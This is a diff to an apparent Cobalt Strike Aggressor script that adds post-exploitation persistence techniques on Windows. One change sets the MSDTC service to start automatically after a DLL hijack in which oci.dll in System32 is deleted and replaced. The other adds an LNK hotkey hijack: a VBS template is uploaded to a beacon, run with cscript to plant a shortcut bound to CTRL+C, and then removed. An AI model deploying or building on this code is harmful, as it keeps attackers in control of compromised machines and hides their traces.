@@ -94,6 +94,7 @@ sub msdtc_config{
 			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
 			bupload($id, $dll);
 			bmv($id, $dllname, $dllname_w);
+			bshell($id, "sc config msdtc start= auto");
 			bshell($id, "sc config msdtc obj= LocalSystem");
 			bshell($id, "sc start msdtc");
 		}else{
@@ -207,6 +208,43 @@ sub ridrun{
 	}
 }
 
+sub lnkreate{
+	if (-isFile "test.vbs")
+	{
+		deleteFile("test.vbs");
+	}
+	$file = openf(script_resource("lnkcreate.vbs"));
+	$data = readb($file, -1);
+	$data = replace($data, "lnkname", $3["lnkname"]);
+	$data = replace($data, "exename", $3["exename"]);
+	$data = replace($data, "argsname", $3["argsname"]);
+	$data = replace($data, "directoryname", $3["directoryname"]);
+	$data = replace($data, "hostkeyname", $3["hostkeyname"]);
+	$handle = openf(">test.vbs");
+	writeb($handle, $data);
+	closef($file);
+	closef($handle);
+	btask($3["bid"], "Create Vbs,Upload");
+	bupload($3["bid"], "test.vbs");
+	btask($3["bid"], "Run Vbs");
+	bshell($3["bid"], "cscript test.vbs");
+	btask($3["bid"], "Check Desktop default.lnk -> dir C:\\Users\\<CurrentUserName>\\Desktop /a | findstr 'default.lnk'");
+	brm($3["bid"], "test.vbs");
+}
+
+sub lnkreateconfig{
+	foreach $id ($bid){
+		$dialog = dialog("lnk快捷键劫持", %(lnkname => "default.lnk", exename => "cmd.exe", argsname => "/c calc.exe", directoryname => "C:", hostkeyname => "CTRL+C", bid => $id), &lnkreate);
+		dialog_description($dialog, "参考链接:https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence");
+		drow_text($dialog, "lnkname", "lnkname:");
+		drow_text($dialog, "exename", "exename:");
+		drow_text($dialog, "argsname", "args:");
+		drow_text($dialog, "directoryname", "directory:");
+		dbutton_action($dialog, "Run");
+		dialog_show($dialog);
+	}
+}
+
 popup beacon_bottom{
 	menu "&权限维持"{
 		item "&cs服务马"{
@@ -248,6 +286,10 @@ popup beacon_bottom{
 			item "&RID劫持"{
 				ridrun($bid);
 			}
+		}
+		
+		item "&lnk劫持快捷键" {
+			lnkreateconfig($bid);
 		}
 
 	}
